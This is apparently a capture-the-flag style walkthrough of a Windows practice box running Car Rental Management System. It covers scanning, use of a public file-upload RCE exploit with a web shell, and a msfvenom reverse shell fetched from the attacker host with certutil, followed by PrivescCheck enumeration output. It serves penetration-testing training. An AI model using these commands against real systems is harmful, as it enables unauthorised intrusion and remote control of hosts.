# 0. Sources

||||
|---|---|---|
|[Reddit](https://www.reddit.com/r/oscp/comments/qd8w9v/need_more_practice_hack_this_windows_practice_box/)|[YouTube](https://www.youtube.com/watch?v=PBlmcWVNBqY)|[Download](https://drive.google.com/file/d/1dRaQ8885JNwsWqYIxBURglkyjtGO3jjZ/view)|

# 1. nmap scan

```console
┌──(root㉿kali)-[~]
└─# nmap -p- -A 10.0.88.34
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 16:13 +08
Nmap scan report for 10.0.88.34
Host is up (0.0017s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.17 ((Win32) OpenSSL/1.0.2d PHP/5.6.14)
|_http-server-header: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.14
| http-title: Car Rental Management System
|_Requested resource was http://10.0.88.34/car-rental/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.17 ((Win32) OpenSSL/1.0.2d PHP/5.6.14)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.14
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn:
|_  http/1.1
| http-title: Car Rental Management System
|_Requested resource was https://10.0.88.34/car-rental/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
445/tcp   open  microsoft-ds  Windows 10 Pro 14393 microsoft-ds (workgroup: ITSL)
3306/tcp  open  mysql         MariaDB (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-11-29T08:14:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=cars
| Not valid before: 2022-11-28T08:10:32
|_Not valid after:  2023-05-30T08:10:32
| rdp-ntlm-info:
|   Target_Name: CARS
|   NetBIOS_Domain_Name: CARS
|   NetBIOS_Computer_Name: CARS
|   DNS_Domain_Name: cars
|   DNS_Computer_Name: cars
|   Product_Version: 10.0.14393
|_  System_Time: 2022-11-29T08:14:16+00:00
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
⋮
```

# 2. Checking for exploits

The target appears to be running a web application called `Car Rental Management System` on HTTP and HTTPS

Let's see if there are any exploits in this:

```console
┌──(root㉿kali)-[~]
└─# searchsploit Car Rental Management System
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Car Rental Management System 1.0 - 'car_id' Sql Injection                   | php/webapps/49056.txt
Car Rental Management System 1.0 - Arbitrary File Upload                    | php/webapps/48931.txt
Car Rental Management System 1.0 - Remote Code Execution (Authenticated)    | php/webapps/49055.txt
Car Rental Management System 1.0 - SQL injection + Arbitrary File Upload    | php/webapps/49025.py
Car Rental Management System 1.0 - SQL Injection / Local File include       | php/webapps/49177.txt
---------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The RCE one looks interesting, the [exploit details](https://www.exploit-db.com/exploits/49055) states to submit a `POST` request to `/car_rental/admin/ajax.php?action=save_settings` that uploads a php file that allows us to execute code

# 3. Testing the exploit

☝️ Notice that the path `car_rental` in the exploit is wrong, it is supposed to be `car-rental`

**Important learning point:** always check the exploit code

## Using Burp Suite to send the exploit

Browse to the target to allow Burp Suite to capture the activity, then select **Send to Repeater**:

![image](https://user-images.githubusercontent.com/90442032/204480542-99cfa163-5551-4526-a55f-18a154821170.png)

Edit the request with the exploit and send the request:

![image](https://user-images.githubusercontent.com/90442032/204480820-4312cf1b-3ebe-4430-82af-241419e61bee.png)

## Using the exploit uploaded

The exploit usage states to use `http://{site}/admin/assets/uploads/{FILE}.php?k=whoami`, but what is the filename uploaded?

Reading the exploit code ` $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];` suggests that it should be in the form of `<epoch-time>_k.php`, but it doesn't help as it's difficult to pinpoint the time of upload

Luckily, the `car-rental/admin/assets/uploads/` path is listable, and we can get the filename from there

```console
┌──(root㉿kali)-[~]
└─# curl http://10.0.88.34/car-rental/admin/assets/uploads/1669710180_k.php?k=whoami
cars\mini

┌──(root㉿kali)-[~]
└─# curl http://10.0.88.34/car-rental/admin/assets/uploads/1669710180_k.php?k=whoami%20/groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

Well done, we got RCE with a admin (High Mandatory Level) user `mini`, let's try to get a shell

# 4. Getting a shell

Generate reverse shell executable and and place in web server root:

(Apache2 is already running with DocumentRoot at /var/www/html)

```console
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/reverse.exe
```

Open another console window on Kali to listen for connections:

```console
┌──(root㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
```

Getting the target to download and run the reverse shell:

☝️ The command we want to run is `certutil.exe /urlcache /f /split http://kali.vx/reverse.exe && .\reverse.exe`, but since we are running it from URL, we need to [URL encode](https://www.urlencoder.org/) the command

```console
┌──(root㉿kali)-[~]
└─# curl http://10.0.88.34/car-rental/admin/assets/uploads/1669710180_k.php?k=certutil.exe%20%2Furlcache%20%2Ff%20%2Fsplit%20http%3A%2F%2Fkali.vx%2Freverse.exe%20%26%26%20.%5Creverse.exe
```

Verify that the reverse shell has hooked on from the listener console

```cmd
connect to [192.168.17.10] from (UNKNOWN) [10.0.88.34] 50844
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\car-rental\admin\assets\uploads>whoami
whoami
cars\mini

C:\xampp\htdocs\car-rental\admin\assets\uploads>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

Excellent, we now have shell on the target

# 5. Getting the proof

```cmd
C:\xampp\htdocs\car-rental\admin\assets\uploads>cd %USERPROFILE%
cd %USERPROFILE%

C:\Users\Mini>certutil.exe -urlcache -f -split https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
certutil.exe -urlcache -f -split https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
****  Online  ****
  000000  ...
  01444c
CertUtil: -URLCache command completed successfully.

C:\Users\Mini>powershell -nop -ep bypass -c "Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -nop -ep bypass -c "Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck"
+------+------------------------------------------------+------+
| TEST | USER > Identity                                | INFO |
+------+------------------------------------------------+------+
| DESC | Get the full name of the current user (domain +       |
|      | username) along with the associated Security          |
|      | Identifier (SID).                                     |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Name             : CARS\Mini
SID              : S-1-5-21-3292391880-3484352872-3067403684-1002
IntegrityLevel   : High Mandatory Level (S-1-16-12288)
SessionId        : 0
TokenId          : 00000000-001a77bd
AuthenticationId : 00000000-0006ac88
OriginId         : 00000000-000003e7
ModifiedId       : 00000000-0006aca6
Source           : Advapi (00000000-0006ac5b)





+------+------------------------------------------------+------+
| TEST | USER > Groups                                  | INFO |
+------+------------------------------------------------+------+
| DESC | List all the groups that are associated to the        |
|      | current user's token.                                 |
+------+-------------------------------------------------------+
[*] Found 12 result(s).

Name                                 Type           SID
----                                 ----           ---
CARS\None                            Group          S-1-5-21-3292391880-3484352872-3067403684-513
Everyone                             WellKnownGroup S-1-1-0
BUILTIN\Users                        Alias          S-1-5-32-545
NT AUTHORITY\SERVICE                 WellKnownGroup S-1-5-6
CONSOLE LOGON                        WellKnownGroup S-1-2-1
NT AUTHORITY\Authenticated Users     WellKnownGroup S-1-5-11
NT AUTHORITY\This Organization       WellKnownGroup S-1-5-15
NT AUTHORITY\Local account           WellKnownGroup S-1-5-113
LOCAL                                WellKnownGroup S-1-2-0
NT AUTHORITY\LogonSessionId_0_437367 LogonSession   S-1-5-5-0-437367
NT AUTHORITY\NTLM Authentication     WellKnownGroup S-1-5-64-10
Mandatory Label\High Mandatory Level Label          S-1-16-12288




+------+------------------------------------------------+------+
| TEST | USER > Privileges                              | INFO |
+------+------------------------------------------------+------+
| DESC | List the current user's privileges and identify the   |
|      | ones that can be leveraged for local privilege        |
|      | escalation.                                           |
+------+-------------------------------------------------------+
[*] Found 7 result(s).

Name                          State    Description                               Exploitable
----                          -----    -----------                               -----------
SeShutdownPrivilege           Disabled Shut down the system                            False
SeChangeNotifyPrivilege       Enabled  Bypass traverse checking                        False
SeUndockPrivilege             Disabled Remove computer from docking station            False
SeImpersonatePrivilege        Enabled  Impersonate a client after authentication        True
SeCreateGlobalPrivilege       Enabled  Create global objects                           False
SeIncreaseWorkingSetPrivilege Disabled Increase a process working set                  False
SeTimeZonePrivilege           Disabled Change the time zone                            False




+------+------------------------------------------------+------+
| TEST | USER > Environment Variables                   | INFO |
+------+------------------------------------------------+------+
| DESC | List the environment variables of the current process |
|      | and try to identify any potentially sensitive         |
|      | information such as passwords or API secrets. This    |
|      | check is simply based on keyword matching and might   |
|      | not be entirely reliable.                             |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | SERVICES > Non-default Services                | INFO |
+------+------------------------------------------------+------+
| DESC | List all registered services and filter out the ones  |
|      | that are built into Windows. It does so by parsing    |
|      | the target executable's metadata.                     |
+------+-------------------------------------------------------+
[*] Found 8 result(s).


Name        : Apache2.4
DisplayName : Apache2.4
ImagePath   : "C:\xampp\apache\bin\httpd.exe" -k runservice
User        : .\Mini
StartMode   : Automatic

Name        : FileZilla Server
DisplayName : FileZillaServer
ImagePath   : "C:\xampp\filezillaftp\filezillaserver.exe"
User        : LocalSystem
StartMode   : Disabled

Name        : FreeSWITCH
DisplayName : FreeSWITCH Multi Protocol Switch
ImagePath   : "C:\Program Files\FreeSWITCH\FreeSwitchConsole.exe"  -service
User        : LocalSystem
StartMode   : Manual

Name        : GoogleChromeElevationService
DisplayName : Google Chrome Elevation Service (GoogleChromeElevationService)
ImagePath   : "C:\Program Files\Google\Chrome\Application\107.0.5304.121\elevation_service.exe"
User        : LocalSystem
StartMode   : Manual

Name        : gupdate
DisplayName : Google Update Service (gupdate)
ImagePath   : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
User        : LocalSystem
StartMode   : Automatic

Name        : gupdatem
DisplayName : Google Update Service (gupdatem)
ImagePath   : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /medsvc
User        : LocalSystem
StartMode   : Manual

Name        : inSyncCPHService
DisplayName : Druva inSync Client Service
ImagePath   : "C:\Program Files (x86)\Druva\inSync\inSyncCPHwnet64.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : mysql
DisplayName : mysql
ImagePath   : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
User        : LocalSystem
StartMode   : Automatic





+------+------------------------------------------------+------+
| TEST | SERVICES > Service Permissions                 | VULN |
+------+------------------------------------------------+------+
| DESC | Interact with the Service Control Manager (SCM) and   |
|      | check whether the current user can modify any         |
|      | registered service.                                   |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > Registry Permissions                | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the registry and check whether the current user |
|      | can modify the configuration of any registered        |
|      | service.                                              |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > Binary Permissions                  | VULN |
+------+------------------------------------------------+------+
| DESC | List all services and check whether the current user  |
|      | can modify the target executable or write files in    |
|      | its parent folder.                                    |
+------+-------------------------------------------------------+
[*] Found 6 result(s).


Name              : Apache2.4
ImagePath         : "C:\xampp\apache\bin\httpd.exe" -k runservice
User              : .\Mini
ModifiablePath    : C:\xampp\apache\bin
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ListDirectory, AddSubdirectory,
                    WriteExtendedAttributes, ReadAttributes, AddFile, ReadExtendedAttributes, Traverse
Status            : Running
UserCanStart      : False
UserCanStop       : False

Name              : Apache2.4
ImagePath         : "C:\xampp\apache\bin\httpd.exe" -k runservice
User              : .\Mini
ModifiablePath    : C:\xampp\apache\bin\httpd.exe
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ReadData, AppendData, WriteExtendedAttributes,
                    ReadAttributes, WriteData, ReadExtendedAttributes, Execute
Status            : Running
UserCanStart      : False
UserCanStop       : False

Name              : FileZilla Server
ImagePath         : "C:\xampp\filezillaftp\filezillaserver.exe"
User              : LocalSystem
ModifiablePath    : C:\xampp\filezillaftp
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ListDirectory, AddSubdirectory,
                    WriteExtendedAttributes, ReadAttributes, AddFile, ReadExtendedAttributes, Traverse
Status            : Stopped
UserCanStart      : False
UserCanStop       : False

Name              : FileZilla Server
ImagePath         : "C:\xampp\filezillaftp\filezillaserver.exe"
User              : LocalSystem
ModifiablePath    : C:\xampp\filezillaftp\filezillaserver.exe
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ReadData, AppendData, WriteExtendedAttributes,
                    ReadAttributes, WriteData, ReadExtendedAttributes, Execute
Status            : Stopped
UserCanStart      : False
UserCanStop       : False

Name              : mysql
ImagePath         : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
User              : LocalSystem
ModifiablePath    : C:\xampp\mysql\bin
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ListDirectory, AddSubdirectory,
                    WriteExtendedAttributes, ReadAttributes, AddFile, ReadExtendedAttributes, Traverse
Status            : Running
UserCanStart      : False
UserCanStop       : False

Name              : mysql
ImagePath         : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
User              : LocalSystem
ModifiablePath    : C:\xampp\mysql\bin\mysqld.exe
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ReadData, AppendData, WriteExtendedAttributes,
                    ReadAttributes, WriteData, ReadExtendedAttributes, Execute
Status            : Running
UserCanStart      : False
UserCanStop       : False





+------+------------------------------------------------+------+
| TEST | SERVICES > Unquoted Path                       | VULN |
+------+------------------------------------------------+------+
| DESC | List registered services and check whether any of     |
|      | them is configured with an unquoted path that can be  |
|      | exploited.                                            |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | SERVICES > SCM Permissions                     | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the current user can perform any        |
|      | privileged actions on the Service Control Manager     |
|      | (SCM).                                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > SAM/SYSTEM/SECURITY Files              | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the SAM/SYSTEM/SECURITY files are       |
|      | configured with weak permissions, allowing a          |
|      | low-privileged user to read them - HiveNightmare      |
|      | (CVE-2021-36934).                                     |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > SAM/SYSTEM/SECURITY in shadow copies   | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the SAM/SYSTEM/SECURITY files in shadow |
|      | copies are configured with weak permissions, allowing |
|      | a low-privileged user to read them. Can happen when   |
|      | HiveNightmare (CVE-2021-36934) mitigations have not   |
|      | been applied manually.                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > Unattend Files                         | VULN |
+------+------------------------------------------------+------+
| DESC | Locate 'Unattend' files and check whether they        |
|      | contain any clear-text credentials.                   |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > WinLogon                               | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the Winlogon registry keys and check whether    |
|      | they contain any clear-text password. Entries that    |
|      | have an empty password field are filtered out.        |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CREDS > Vault Creds                            | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the credentials that are saved in the       |
|      | current user's vault.                                 |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | CREDS > Vault List                             | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the web credentials that are saved in the   |
|      | current user's Vault.                                 |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | CREDS > GPP Passwords                          | VULN |
+------+------------------------------------------------+------+
| DESC | Locate old cached Group Policy Preference files that  |
|      | contain a 'cpassword' field and extract the           |
|      | clear-text credentials.                               |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | HARDENING > Credential Guard                   | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether Credential Guard is supported and      |
|      | enabled.                                              |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Name                                  : Credential Guard
DeviceGuardSecurityServicesConfigured : (null)
DeviceGuardSecurityServicesRunning    : (null)
Description                           : Credential Guard is not configured
Compliance                            : False





+------+------------------------------------------------+------+
| TEST | HARDENING > BitLocker                          | INFO |
+------+------------------------------------------------+------+
| DESC | Check whether BitLocker is configured and enabled on  |
|      | the system drive. Note that this check will yield a   |
|      | false positive if another encryption software is in   |
|      | use.                                                  |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Key         : HKLM\SYSTEM\CurrentControlSet\Control\BitLockerStatus
Value       : BootStatus
Data        : 0
Description : BitLocker is disabled
Compliance  : False





+------+------------------------------------------------+------+
| TEST | CONFIG > PATH Folder Permissions               | VULN |
+------+------------------------------------------------+------+
| DESC | Retrieve the list of SYSTEM %PATH% folders and check  |
|      | whether the current user has some write permissions   |
|      | in any of them.                                       |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | MISC > Hijackable DLLs                         | INFO |
+------+------------------------------------------------+------+
| DESC | List Windows services that are prone to Ghost DLL     |
|      | hijacking. This is particularly relevant if the       |
|      | current user can create files in one of the SYSTEM    |
|      | %PATH% folders.                                       |
+------+-------------------------------------------------------+
[*] Found 2 result(s).


Name           : cdpsgshims.dll
Description    : Loaded by CDPSvc upon service startup
RunAs          : NT AUTHORITY\LocalService
RebootRequired : True

Name           : WptsExtensions.dll
Description    : Loaded by the Task Scheduler upon service startup
RunAs          : LocalSystem
RebootRequired : True





+------+------------------------------------------------+------+
| TEST | CONFIG > AlwaysInstallElevated                 | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the 'AlwaysInstallElevated' registry    |
|      | keys are configured and enabled. If so any user might |
|      | be able to run arbitary MSI files with SYSTEM         |
|      | privileges.                                           |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CONFIG > WSUS Configuration                    | VULN |
+------+------------------------------------------------+------+
| DESC | If WSUS is configured and enabled, check whether the  |
|      | service uses an insecure URL (http://*). If so, it    |
|      | might be vulnerable to MitM attacks. Note that in     |
|      | case of local exploitation, the value of              |
|      | 'SetProxyBehaviorForUpdateDetection' determines       |
|      | whether the service uses the system or user proxy     |
|      | settings.                                             |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CONFIG > Hardened UNC Paths                    | VULN |
+------+------------------------------------------------+------+
| DESC | Check hardened UNC paths. If not properly configured, |
|      | a Man-in-the-Middle might be able to run arbitrary    |
|      | code with SYSTEM privileges by injecting malicious    |
|      | group policies during a group policy update (SYSVOL   |
|      | only).                                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CONFIG > SCCM Cache Folder (info)              | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether the SCCM cache folder exists. Manual   |
|      | investigation might be required during                |
|      | post-exploitation.                                    |
+------+-------------------------------------------------------+
[!] Nothing found.


+------+------------------------------------------------+------+
| TEST | CONFIG > SCCM Cache Folder                     | VULN |
+------+------------------------------------------------+------+
| DESC | Checks whether the current user can browse the SCCM   |
|      | cache folder. If so, hardcoded credentials might be   |
|      | extracted from MSI package files or scripts.          |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CONFIG > Point and Print                       | VULN |
+------+------------------------------------------------+------+
| DESC | Checks whether the Print Spooler service is enabled   |
|      | and if the Point and Print configuration allows       |
|      | low-privileged users to install printer drivers.      |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | CONFIG > Driver Co-Installers                  | INFO |
+------+------------------------------------------------+------+
| DESC | Check whether the 'DisableCoInstallers' registry key  |
|      | is absent or disabled. If so any user might be able   |
|      | to run arbitrary code with SYSTEM privileges by       |
|      | plugging a device automatically installing vulnerable |
|      | software along with its driver.                       |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Key         : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Installer
Value       : DisableCoInstallers
Data        : (null)
Description : CoInstallers are enabled (default)
Compliance  : False





+------+------------------------------------------------+------+
| TEST | UPDATES > System up to date?                   | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the installed updates and hotfixes and      |
|      | check whether a patch was applied in the last 31      |
|      | days.                                                 |
+------+-------------------------------------------------------+
[!] Not vulnerable.


+------+------------------------------------------------+------+
| TEST | MISC > User session list                       | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the sessions of the currently logged-on     |
|      | users. It might be possible to capture or relay the   |
|      | NTLM/Kerberos authentication of these users           |
|      | (RemotePotato0, KrbRelay).                            |
+------+-------------------------------------------------------+
[!] Nothing found.


+-----------------------------------------------------------------------------+
|                         ~~~ PrivescCheck Report ~~~                         |
+----+------+-----------------------------------------------------------------+
| OK | None | CONFIG > Hardened UNC Paths                                     |
| NA | None | CONFIG > SCCM Cache Folder (info)                               |
| OK | None | CONFIG > PATH Folder Permissions                                |
| OK | None | CONFIG > WSUS Configuration                                     |
| NA | None | CONFIG > Driver Co-Installers -> 1 result(s)                    |
| OK | None | CONFIG > AlwaysInstallElevated                                  |
| OK | None | CONFIG > SCCM Cache Folder                                      |
| OK | None | CONFIG > Point and Print                                        |
| OK | None | CREDS > Unattend Files                                          |
| NA | None | CREDS > Vault List                                              |
| OK | None | CREDS > WinLogon                                                |
| OK | None | CREDS > SAM/SYSTEM/SECURITY in shadow copies                    |
| NA | None | CREDS > Vault Creds                                             |
| OK | None | CREDS > GPP Passwords                                           |
| OK | None | CREDS > SAM/SYSTEM/SECURITY Files                               |
| NA | None | HARDENING > Credential Guard -> 1 result(s)                     |
| NA | None | HARDENING > BitLocker -> 1 result(s)                            |
| NA | None | MISC > Hijackable DLLs -> 2 result(s)                           |
| NA | None | MISC > User session list                                        |
| OK | None | SERVICES > Registry Permissions                                 |
| OK | None | SERVICES > Service Permissions                                  |
| NA | None | SERVICES > Non-default Services -> 8 result(s)                  |
| OK | None | SERVICES > SCM Permissions                                      |
| OK | None | SERVICES > Unquoted Path                                        |
| KO | High | SERVICES > Binary Permissions -> 6 result(s)                    |
| OK | None | UPDATES > System up to date?                                    |
| NA | None | USER > Identity -> 1 result(s)                                  |
| NA | None | USER > Groups -> 12 result(s)                                   |
| NA | None | USER > Environment Variables                                    |
| NA | None | USER > Privileges -> 7 result(s)                                |
+----+------+-----------------------------------------------------------------+
WARNING: To get more info, run this script with the option '-Extended'.

```
